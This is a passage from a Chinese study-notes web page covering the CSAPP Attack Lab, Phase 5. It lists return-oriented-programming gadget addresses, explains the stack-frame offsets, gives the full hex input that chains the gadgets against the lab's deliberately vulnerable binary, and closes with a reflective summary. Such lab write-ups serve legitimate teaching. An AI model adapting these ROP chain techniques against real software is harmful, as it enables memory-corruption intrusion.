plain">#地址：0x4019cc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popq %rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x4019dd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movl %eax, %edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x401a70</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movl %edx, %ecx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x401a13</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movl %ecx, %esi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x4019d6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea    (%rdi,%rsi,1),%rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x4019a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movq %rax, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="栈帧讲解-3">栈帧讲解<a href="#栈帧讲解-3" class="hash-link" aria-label="栈帧讲解的直接链接" title="栈帧讲解的直接链接">​</a></h3><p>为节省空间，每一行代码都省略了后面的<code>ret</code>，</p><p><img loading="lazy" src="/assets/images/image-20220305192432219-0225dd9cbad8045ee450baf8c1529413.png" width="1132" height="796" class="img_ev3q"></p><p>逻辑在图上标的很清楚，这里就不再用文字写啦！</p><p><strong>要注意</strong>，<code>getbuf</code>执行<code>ret</code>后相当于进行了一次<code>pop</code>操作，<code>test</code>的栈顶指针<code>%rsp=%rsp+0x8</code>，所以<code>cookie</code>相对于此时栈顶指针的偏移量是<code>0x48</code>而不是<code>0x50</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution-4">Solution<a href="#solution-4" class="hash-link" aria-label="Solution的直接链接" title="Solution的直接链接">​</a></h3><p>根据上图的栈帧，写出输入序列：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ad 1a </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a2 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cc </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> 00 00 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">70</span><span class="token plain"> 1a </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">13</span><span class="token plain"> 1a </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d6 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a2 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fa </span><span class="token number" style="color:#36acaa">18</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">62</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="/assets/images/image-20220305193301330-9d9066651b1a1781cc6a46e1c53531e2.png" width="964" height="384" class="img_ev3q"></p><p><strong>Pass! 攻击成功！</strong></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h2><ul><li>本实验涉及的内容在课本中只有短短几页的篇幅，而实际操作中却要考虑如此多的东西，确实是那句话“纸上得来终觉浅，绝知此事要躬行”。五个<code>Phase</code>的难度是层层递进的，<code>Part 1</code>让我对部分汇编指令以及栈的原理有了更深的领悟；<code>Part 2</code>可能就更加贴合实际工程项目了，我在这里初步学习了“ROP”这一天才的攻击技术，实现成功的攻击需要对每一个字节都能有足够的敏感。同时，在我以后编写的代码中，也应该注意到缓冲区溢出的问题</li><li>本实验耗时2天，约9小时</li></ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/kcxain/Kcx_Learning/tree/master/docs/system/CSAPP/Lab03-Attack_Lab.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文档分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/system/CSAPP/Lab02-Bomb_Lab"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Lab2-Bomb Lab 深入解析</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/system/CSAPP/Lab04-Architecture_Lab"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Lab4-Architecture Lab 深入解析</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#实验概览" class="table-of-contents__link toc-highlight">实验概览</a></li><li><a href="#part-1-code-injection-attacks" class="table-of-contents__link toc-highlight">Part 1: Code Injection Attacks</a></li><li><a href="#phase-1" class="table-of-contents__link toc-highlight">Phase 1</a><ul><li><a href="#分析" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#反汇编test" class="table-of-contents__link toc-highlight">反汇编<code>test</code></a></li><li><a href="#反汇编getbuf" class="table-of-contents__link toc-highlight">反汇编<code>getbuf</code></a></li><li><a href="#solution" class="table-of-contents__link toc-highlight">Solution</a></li></ul></li><li><a href="#phase-2" class="table-of-contents__link toc-highlight">Phase 2</a><ul><li><a href="#分析-1" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#注入代码" class="table-of-contents__link toc-highlight">注入代码</a></li><li><a href="#栈帧讲解" class="table-of-contents__link toc-highlight">栈帧讲解</a></li><li><a href="#solution-1" class="table-of-contents__link toc-highlight">Solution</a></li></ul></li><li><a href="#phase-3" class="table-of-contents__link toc-highlight">Phase 3</a><ul><li><a href="#分析-2" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#注入代码-1" class="table-of-contents__link toc-highlight">注入代码</a></li><li><a href="#栈帧讲解-1" class="table-of-contents__link toc-highlight">栈帧讲解</a></li><li><a href="#solution-2" class="table-of-contents__link toc-highlight">Solution</a></li></ul></li><li><a href="#part-2-return-oriented-programming" class="table-of-contents__link toc-highlight">Part 2: Return-Oriented Programming</a></li><li><a href="#phase-4" class="table-of-contents__link toc-highlight">Phase 4</a><ul><li><a href="#分析-3" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#栈帧讲解-2" class="table-of-contents__link toc-highlight">栈帧讲解</a></li><li><a href="#solution-3" class="table-of-contents__link toc-highlight">Solution</a></li></ul></li><li><a href="#phase-5" class="table-of-contents__link toc-highlight">Phase 5</a><ul><li><a href="#分析-4" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#栈帧讲解-3" class="table-of-contents__link toc-highlight">栈帧讲解</a></li><li><a href="#solution-4" class="table-of-contents__link toc-highlight">Solution</a></li></ul></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">联系我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/kcxain" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://www.zhihu.com/people/deconx" target="_blank" rel="noopener noreferrer" class="footer__link-item">知乎<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://twitter.com/kecxain" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 CS-Notes, Inc. Built with Docusaurus.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.dfe70d3f.js"></script>
<script src="/assets/js/main.2610bda6.js"></script>
</body>
</html>